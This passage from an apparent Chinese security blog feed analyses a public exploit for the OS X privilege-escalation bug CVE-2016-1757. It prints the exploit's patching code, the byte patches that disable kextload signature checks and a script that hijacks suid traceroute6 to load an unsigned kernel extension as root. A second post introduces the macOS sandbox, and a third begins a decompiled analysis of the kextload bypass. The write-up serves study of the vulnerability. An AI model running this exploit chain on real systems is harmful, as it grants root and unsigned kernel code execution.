class="number">15308</span>  <span class="number">4</span> <span class="number">13</span> <span class="number">11</span>:<span class="number">00</span> executer</span><br><span class="line">-rw-r--r--   <span class="number">1</span> turing  staff  <span class="number">17534</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">11</span>:<span class="number">02</span> executer.c</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff     <span class="number">37</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> kextload_<span class="built_in">disable</span>_signature_checks.binpatch</span><br><span class="line">-rwxr-xr-x   <span class="number">1</span> turing  staff   <span class="number">1849</span>  <span class="number">4</span> <span class="number">13</span> <span class="number">10</span>:<span class="number">45</span> load_kext.sh</span><br><span class="line">-rwxr-xr-x@  <span class="number">1</span> turing  staff    <span class="number">591</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> root_shell.sh</span><br><span class="line">-rwxr-xr-x@  <span class="number">1</span> turing  staff   <span class="number">1106</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> unload_kext.sh</span><br><span class="line">➜  executer</span><br></pre></td></tr></table></figure>
<p>主要由5个部分组成</p>
<ul>
<li>FakeKext.kext：最终加载的测试内核扩展。</li>
<li>*.py: 用来生成对<code>traceroute6</code>的<code>binpatch</code>文件。</li>
<li>executer：通过<code>binpatch</code>文件，对需要执行的目标程序进行<code>patch</code>。</li>
<li>kextload_disable_signature_checks.binpatch：存储了<code>kextload</code>需要<code>patch</code>的地址与内容。</li>
<li>*.sh:驱动整个流程的脚本。</li>
</ul>
<h1 id="0x02_Exploit详细分析">0x02 Exploit详细分析</h1><p>如果直接打开<code>load_kext.sh</code>有<strong>可能</strong>一眼看不出到底流程是什么样子的，所以的先对几个重要的组件做一下详细的分析。</p>
<h2 id="2-1_executer与binpatch">2.1 executer与binpatch</h2><p><code>executer</code>是整个<code>exploit</code>中最核心的部分，核心功能有两个。</p>
<ul>
<li>通过<code>apply_patch</code>函数获取目标进程需要<code>patch</code>的内容并保存在内存中。</li>
<li>通过<code>fork</code>子进程在执行目标程序时存在的时间窗口通过<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/#1-3_Ports">PORT</a>对目标进程进行内存的改写。</li>
</ul>
<p>通过时间窗口改写目标进程的内存和<code>POC</code>中的实现大同小异，可以参考之前分析<code>POC</code>的<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">文章</a>。</p>
<p>这里简单的分析一个<code>apply_patch</code>函数与</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// at what offset (rounded down to a page boundary) from the start of the mapping in the target should we write?</span></span><br><span class="line"><span class="keyword">size_t</span> target_patch_start_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// how much should we write (rounded up to a page boundary)</span></span><br><span class="line"><span class="keyword">size_t</span> target_patch_write_length = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pointer to the replacement bytes to overwrite with</span></span><br><span class="line"><span class="keyword">char</span>* replacement_bytes = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* apply the patch, recording the lowest and highest addresses we touch */</span></span><br><span class="line"><span class="comment">// original is page-aligned</span></span><br><span class="line"><span class="comment">// 对original文件进行patch</span></span><br><span class="line"><span class="comment">// 这个patch的函数只是为了对kextload进行patch，关闭对未签名内核扩展的验证</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* kextload_disable_signature_checks</span><br><span class="line"> * 0000000000000000  C9 20 00 00 03 00 00 00  31 C0 C3 94 27 00 00 05  . ......1...'...</span><br><span class="line"> * 0000000000000010  00 00 00 90 90 90 31 C0  0D 28 00 00 05 00 00 00  ......1..(......</span><br><span class="line"> * 0000000000000020  90 90 90 31 C0                                    ...1.</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 理论上patch_length = 0x1000,因为length经过roundup的处理。</span></span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">apply_patch</span><span class="params">(<span class="keyword">char</span>* original, size_t original_length, <span class="keyword">char</span>* patch, size_t patch_length)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// patch format is:</span></span><br><span class="line">  <span class="comment">// u32 offset</span></span><br><span class="line">  <span class="comment">// u32 length</span></span><br><span class="line">  <span class="comment">// u8 * length bytes to be written</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//这两个字段用来计算内存中需要保存的数据的开始位置和解释位置</span></span><br><span class="line">  <span class="keyword">char</span>* lowest = (<span class="keyword">char</span>*)UINTPTR_MAX; </span><br><span class="line">  <span class="keyword">char</span>* highest = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> remaining = patch_length;</span><br><span class="line">  <span class="keyword">while</span> (remaining &gt; <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset = *(<span class="keyword">uint32_t</span>*)patch;</span><br><span class="line">    <span class="keyword">uint32_t</span> length = *(<span class="keyword">uint32_t</span>*)(patch+<span class="number">4</span>);</span><br><span class="line">    remaining -= <span class="number">8</span>;</span><br><span class="line">    patch += <span class="number">8</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/*</span><br><span class="line">    	以kextload_disable_signature_checks为例</span><br><span class="line">    	0x000020c9处开始0x00000003个字节改写为0x31 0xc0 0xc3</span><br><span class="line">    	0x00002794处开始0x00000005个字节改写为0x90 0x90 0x90 0x31 0xc0</span><br><span class="line">    	0x0000280D处开始0x00000005个字节改写为0x90 0x90 0x90 0x31 0xc0</span><br><span class="line">    */</span></span><br><span class="line">    </span><br><span class="line">   	<span class="comment">/* 错误处理*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// record if we're extending the boundaries of touched pages</span></span><br><span class="line">    <span class="comment">// 根据patch的地址重新计算两个变量值</span></span><br><span class="line">    <span class="keyword">if</span> ((original+offset) &lt; lowest) &#123;</span><br><span class="line">      lowest = original+offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((original+offset+length) &gt; highest) &#123;</span><br><span class="line">      highest = original+offset+length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// apply the patch</span></span><br><span class="line">    <span class="built_in">memcpy</span>(original+offset, patch, length);</span><br><span class="line">    remaining -= length;</span><br><span class="line">    patch += length;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//需要改写到目标进程的数据的起始</span></span><br><span class="line">  replacement_bytes = ptr_rounddown(lowest);</span><br><span class="line">  <span class="comment">//改写内容在目标进程中的起始位置</span></span><br><span class="line">  target_patch_start_offset = replacement_bytes - original;</span><br><span class="line">  <span class="comment">//需要改写的内容的长度</span></span><br><span class="line">  target_patch_write_length = ptr_roundup(highest) - replacement_bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结合对<code>port</code>的利用，流程大致如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/patch.png" alt="patch"></p>
<p>所以<code>executer</code>可以理解为一个抽象的工具，该工具的作用就是通过<code>binpatch</code>文件的内容，对目标程序进行<code>patch</code>并执行。</p>
<h2 id="2-2_通过Patch绕过加载驱动对签名的要求">2.2 通过Patch绕过加载驱动对签名的要求</h2><p>整个bindiff的比较，以及源码位置可以参照之前的这篇文章。<a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/">利用patch绕过kextload对内核签名的检测</a>。</p>
<p>这里说一下几个被<code>patch</code>掉的函数的关系。</p>
<table>
<thead>
<tr>
<th>patch点</th>
<th>行为</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x000020c9</td>
<td>整个函数内容变为return 0；</td>
<td>使得加载扩展时的权限检测都返回成功</td>
</tr>
<tr>
<td>0x00002794</td>
<td>绕过对sub_0979函数的调用</td>
<td>sub_0979会调用签名合法的检测</td>
</tr>
<tr>
<td>0x0000280d</td>
<td>绕过对sub_085c函数的调用</td>
<td>sub_085c会调用sub_0979</td>
</tr>
</tbody>
</table>
<h2 id="2-3_load_kext-sh">2.3 load_kext.sh</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># loading an unsigned kext is a two step process - first we need root</span><br><span class="line"># then we need to get the com.apple.rootless.kext-management entitlement</span><br><span class="line"></span><br><span class="line"># so let's build a simple shellscript to run as root:</span><br><span class="line"></span><br><span class="line"># 加载一个没有签名的驱动程序</span><br><span class="line"># 1.root权限</span><br><span class="line"># 2.获取com.apple.rootless.kext-management权限</span><br><span class="line"></span><br><span class="line">if [ -z $1 ]</span><br><span class="line">then</span><br><span class="line">  echo 'usage: ./load_kext.sh &lt;path/to/kext&gt;'</span><br><span class="line">  exit $E_MISSING_POS_PARAM</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># we have a binary patch for the 10.11.3 version of kextload (which has the kext-management entitlement)</span><br><span class="line"># so lets build a script we can exec as root to apply that patch and load our kext</span><br><span class="line"></span><br><span class="line"># 通过patch可以使得kextload拥有权限</span><br><span class="line"></span><br><span class="line"># first, we need a thin'ed version of kextload</span><br><span class="line"># 从fat格式中提取x86_64的macho文件</span><br><span class="line">lipo -thin x86_64 -output kextload_64 `which kextload`</span><br><span class="line"></span><br><span class="line"># 生成patch kextload并加载内核扩展的脚本</span><br><span class="line">echo '#!/bin/zsh' &gt; kext_loading_helper.sh</span><br><span class="line">echo "# run me as root to load: $1" &gt;&gt; kext_loading_helper.sh</span><br><span class="line">echo "/usr/sbin/chown -R root:wheel $1" &gt;&gt; kext_loading_helper.sh</span><br><span class="line">echo "./executer -p kextload_disable_signature_checks.binpatch -o kextload_64 -- `which kextload` $1" &gt;&gt; kext_loading_helper.sh</span><br><span class="line">chmod +x kext_loading_helper.sh</span><br><span class="line"></span><br><span class="line"># build a binary patch to apply to traceroute6 (a suid-root binary, any will do though*) which overwrites</span><br><span class="line"># its entrypoint with shellcode to exec the script we just wrote (note that its a zsh script so will maintain euid 0)</span><br><span class="line"># 根据python脚本生成对traceroute6进行patch的binpatch文件</span><br><span class="line"># 目标是为了利用漏洞在root权限下执行上面生成的kext_loading_helper.sh脚本</span><br><span class="line">python build_exec_patch.py `which traceroute6` `pwd`/kext_loading_helper.sh traceroute6_exec_kextloader.binpatch</span><br><span class="line"></span><br><span class="line"># use the exploit to apply that patch at exec time to the suid-root binary</span><br><span class="line"># 利用刚刚生成的binpatch执行traceroute6</span><br><span class="line">./executer -p traceroute6_exec_kextloader.binpatch -o `which traceroute6` -- `which traceroute6` -invalid</span><br><span class="line"></span><br><span class="line"># cleanup</span><br><span class="line">rm -rf kextload_64 kext_loading_helper.sh traceroute6_exec_kextloader.binpatch</span><br><span class="line"></span><br><span class="line"># * if you choose a fat binary pass a lipo'ed thin version to -o</span><br><span class="line"># so lets build a script we can exec as root to apply that patch and load our kext:</span><br></pre></td></tr></table></figure>
<p>整体的执行流程大致如下图所示:</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/kextload.png" alt="kextload"></p>
<h1 id="0x03_小结">0x03 小结</h1><p>至此<code>CVE-2016-1757</code>的分析告一段落，结合<code>POC</code>的分析有几个知识需要巩固与思考。</p>
<ul>
<li><code>PORT</code>的使用。</li>
<li><code>exec</code>的流程。</li>
<li>内存<code>patch</code>在漏洞利用时的用法。</li>
<li>在<code>exec</code>的启动流程中，根据新旧内存对象替换的时机比较稳定的找到时间窗口。</li>
</ul>
<p>漏洞的成因个人总结为2点：</p>
<ul>
<li>进程在执行过程中权限会得到提高</li>
<li>进程在执行的流程存在被<code>patch</code>的机会</li>
</ul>
<h1 id="引用">引用</h1><p>1.<a href="http://googleprojectzero.blogspot.com/2016/03/race-you-to-kernel.html" target="_blank" rel="external">Race you to the kernel!</a></p>
<p>2.<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;redir=1" target="_blank" rel="external">Logic error when exec-ing suid binaries allows code execution as root on OS X/iOS</a></p>
<h1 id="PS">PS</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0X00_摘要">0X00  摘要</h1><p>通过对<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>的<code>POC</code>进行分析，已经完全了解了这个这个漏洞的成因，这里带来其一个<code>Exploit</code>的分析。</p>
<p>相关的<code>poc</code>可以到我的<code>github</code>上面获取</p>
<p><a href="https://github.com/turingH/exploit">https://github.com/turingH/exploit</a></p>
<p>或者直接在<code>google</code>的<code>project zero</code>中下载。</p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id">https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id</a></p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="execv" scheme="http://turingh.github.io/tags/execv/"/>
    
      <category term="ports" scheme="http://turingh.github.io/tags/ports/"/>
    
      <category term="race" scheme="http://turingh.github.io/tags/race/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/OS-X/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[apple沙盒研究之基础知识]]></title>
    <link href="http://turingh.github.io/2016/04/18/apple%E6%B2%99%E7%9B%92%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://turingh.github.io/2016/04/18/apple沙盒研究之基础知识/</id>
    <published>2016-04-18T15:12:47.000Z</published>
    <updated>2016-04-19T18:52:38.000Z</updated>
    <content type="html"><![CDATA[<h1 id="1_基础知识">1 基础知识</h1><h1 id="1-1_什么是沙盒？">1.1 什么是沙盒？</h1><blockquote>
<p>在<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8" target="_blank" rel="external">计算机安全</a>领域，<strong>沙盒</strong>（英语：sandbox，又译为<strong>沙箱</strong>）是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用<a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8" target="_blank" rel="external">[1]</a>#cite_note-1)。</p>
<p>沙盒通常严格控制其中的程序所能访问的资源，比如，沙盒可以提供<a href="https://zh.wikipedia.org/wiki/%E5%A1%97%E9%8A%B7%E7%A9%BA%E9%96%93" target="_blank" rel="external">用后即回收</a>的磁盘及内存空间。在沙盒中，网络访问、对真实系统的访问、对输入设备的读取通常被禁止或是严格限制。从这个角度来说，沙盒属于<a href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E5%8C%96" target="_blank" rel="external">虚拟化</a>的一种。</p>
<p>沙盒中的所有改动对<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F" target="_blank" rel="external">操作系统</a>不会造成任何损失。通常，这种技术被<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA" target="_blank" rel="external">计算机</a>技术人员广泛用于测试可能<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92" target="_blank" rel="external">带毒</a>的程序或是其他的<a href="https://zh.wikipedia.org/wiki/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6" target="_blank" rel="external">恶意代码</a><a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8" target="_blank" rel="external">[2]</a>#cite_note-2)。</p>
<p>— 维基百科,沙盒 (计算机安全)</p>
</blockquote>
<p>这样一段话说的已经很清楚了，关于在<code>OS X</code>系统中沙盒的简单应用，也有文章解释过了，这些不是本文的核心内容，有兴趣的读者可以自行<code>google</code>。</p>
<p>在<code>OS X</code>以及<code>IOS</code>系统中限制了进程对一些资源的访问权限，例如网络、某些特殊路径、文件的读写等等，限定了进程的一些行为，从而保证进程不会做出超越权限的操作。</p>
<a id="more"></a>
<p>沙盒听上去的感觉是一个进程在一个有保护的环境中执行，不会做出规定范围内不允许的事情，给人的感觉可能是这样的：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_feels_like.png.png" alt="沙盒"></p>
<p>这样的理解对应用开发来说已经够用了，通过理解沙盒的内部实现，发现沙盒的实质其实更像是这样的：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_really.png" alt="沙盒"></p>
<p>而在<code>OS X</code>中沙盒也被称作<code>seatbelt</code>。<code>APP</code>的一举一动都被<code>TrustedBSD</code>的<code>HOOK</code>组件监控，根据沙盒使用的<code>profile</code>中的配置做出相应的处理。</p>
<p>下面 就通过简单的分析沙盒的工作流程，详细了解沙盒的工作原理。</p>
<h2 id="1-2_沙盒工作流程与相关系统组件">1.2 沙盒工作流程与相关系统组件</h2><p>沙盒的大致工作流程入下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_workflow.png" alt="sandbox_workflow"></p>
<ul>
<li><code>1</code>进程尝试进行一次系统调用（system call），调用内核功能。</li>
<li><code>2、3</code>MAC层需要根据该进程的安全策略判断此次系统调用是否可以执行。</li>
<li><code>4、5、6、7、8、9</code>如果存在策略的话，通过<code>sandbox.kext</code>（hook函数）和<code>AppleMatch.kext</code>（沙盒的profile解析）两个内核扩展实现权限的检查。</li>
<li><code>10</code>返回调用结果</li>
</ul>
<p>与沙盒系统相关的模块大致如下：</p>
<ul>
<li>libSystem.dylib: 提供<code>sandbox_init</code>、<code>sandbox_free_error</code>等函数。</li>
<li>libSandbox.dylib: 提供解析，编译，生成<code>*.sb</code>的沙盒<code>profile</code>的函数。</li>
<li>sandbox.kext：提供了system call的hook函数</li>
<li>AppleMatch.kext：提供了解析<code>profile</code>的函数</li>
</ul>
<p>结构图大致如下：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_birdview.png" alt="结构图"></p>
<h1 id="1-3_小结">1.3 小结</h1><p>​    沙盒的工作流程大致可以总结为：</p>
<ol>
<li><p>通过<code>sandbox_init</code>初始化某沙盒策略脚本并编译为二进制文件</p>
</li>
<li><p>在进程进行<code>system call</code>时，通过<code>TrustedBSD</code>提供的<code>hook</code>模块，利用<code>Sandbox.kext</code>提供的<code>system call hook</code>函数，结合沙盒策略进行判断，该进程是否有权限执行该<code>system call</code>。</p>
</li>
</ol>
<p>   通过对这些基础知识的了解，可以进入对沙盒的进一步研究了，在下一章通过逆向以及部分源码，从代码实现的层面进行更深一层次的分析。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="1_基础知识">1 基础知识</h1><h1 id="1-1_什么是沙盒？">1.1 什么是沙盒？</h1><blockquote>
<p>在<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8">计算机安全</a>领域，<strong>沙盒</strong>（英语：sandbox，又译为<strong>沙箱</strong>）是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用<a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8">[1]</a>#cite_note-1)。</p>
<p>沙盒通常严格控制其中的程序所能访问的资源，比如，沙盒可以提供<a href="https://zh.wikipedia.org/wiki/%E5%A1%97%E9%8A%B7%E7%A9%BA%E9%96%93">用后即回收</a>的磁盘及内存空间。在沙盒中，网络访问、对真实系统的访问、对输入设备的读取通常被禁止或是严格限制。从这个角度来说，沙盒属于<a href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E5%8C%96">虚拟化</a>的一种。</p>
<p>沙盒中的所有改动对<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>不会造成任何损失。通常，这种技术被<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA">计算机</a>技术人员广泛用于测试可能<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92">带毒</a>的程序或是其他的<a href="https://zh.wikipedia.org/wiki/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6">恶意代码</a><a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8">[2]</a>#cite_note-2)。</p>
<p>— 维基百科,沙盒 (计算机安全)</p>
</blockquote>
<p>这样一段话说的已经很清楚了，关于在<code>OS X</code>系统中沙盒的简单应用，也有文章解释过了，这些不是本文的核心内容，有兴趣的读者可以自行<code>google</code>。</p>
<p>在<code>OS X</code>以及<code>IOS</code>系统中限制了进程对一些资源的访问权限，例如网络、某些特殊路径、文件的读写等等，限定了进程的一些行为，从而保证进程不会做出超越权限的操作。</p>]]>
    
    </summary>
    
      <category term="sandbox" scheme="http://turingh.github.io/tags/sandbox/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[利用patch绕过kextload对内核签名的检测]]></title>
    <link href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/"/>
    <id>http://turingh.github.io/2016/04/13/利用patch绕过kextload对内核签名的检测/</id>
    <published>2016-04-13T17:21:22.000Z</published>
    <updated>2016-04-19T18:44:37.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    分析<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>的EXP过程中，发现EXP通过对kextload程序的patch，绕过了<code>OSX</code>对驱动扩展数字签名的检测，成功加载未签名的驱动扩展。</p>
<a id="more"></a>
<h1 id="0x01_数字签名与内核扩展">0x01 数字签名与内核扩展</h1><p>​    <code>OSX</code>系统在加载内核扩展时要求必须拥有苹果的开发者签名。在开发过程中，在自己的调试环境中可以通过修改参数加载没有签名的驱动，进行开发与调试。</p>
<h2 id="1-1_OS_X_10-11之后版本">1.1 OS X 10.11之后版本</h2><p>​    在OS X 10.11中引入的Rootless机制之后只需要关闭Rootless机制就可以加载没有签名的驱动扩展。细节可以参考这一篇文章。<a href="http://tadaland.com/os-x-rootless.html" target="_blank" rel="external">OS X 10.11中Rootless的实现与解释以及关闭方法</a></p>
<h2 id="1-2_OS_X_10-11之前版本">1.2 OS X 10.11之前版本</h2><p>​    在OS X 10.11之前的版本需要修改内核启动参数，并重启系统</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nvram boot-args=<span class="string">"kext-dev-mode=1"</span></span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
<h1 id="0x02_Patch详细分析">0x02 Patch详细分析</h1><p>​    通过对<code>kextload</code>程序patch前后的对比可以发现，总共对两个函数进行了patch。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/ida_diff.png" alt="ida_bindiff"></p>
<h2 id="2-1_sub_100020c9(check_root)">2.1 sub_100020c9(check_root)</h2><p>​    通过<code>bindiff</code>发现，<code>sub_100020c9</code>函数改变非常的大（rename成了check_root，不一定完全正确），patch前后对比如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/bindff_check_root.png" alt="check_root"></p>
<p>该函数内容被完全替换，直接返回0。</p>
<p>通过ida看一下替换前该函数的伪代码，可以大致了解该函数的作用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall check_root@&lt;rax&gt;(__int64 a1@&lt;rax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// ebx@3</span></span><br><span class="line">  __int64 v3; <span class="comment">// [sp-4h] [bp-10h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  HIDWORD(v3) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( bootstrap_look_up(*(_DWORD *)bootstrap_port_ptr, <span class="string">"com.apple.KernelExtensionServer"</span>, (<span class="keyword">mach_port_t</span> *)&amp;v3 + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( geteuid() )</span><br><span class="line">    &#123;</span><br><span class="line">      OSKextLog(<span class="number">0L</span>L, <span class="number">113L</span>L, <span class="string">"Can't contact kextd; must run as root to load kexts."</span>);</span><br><span class="line">      v1 = <span class="number">77</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">0</span>;</span><br><span class="line">      OSKextLog(<span class="number">0L</span>L, <span class="number">115L</span>L, <span class="string">"Can't contact kextd; attempting to load directly into kernel."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span 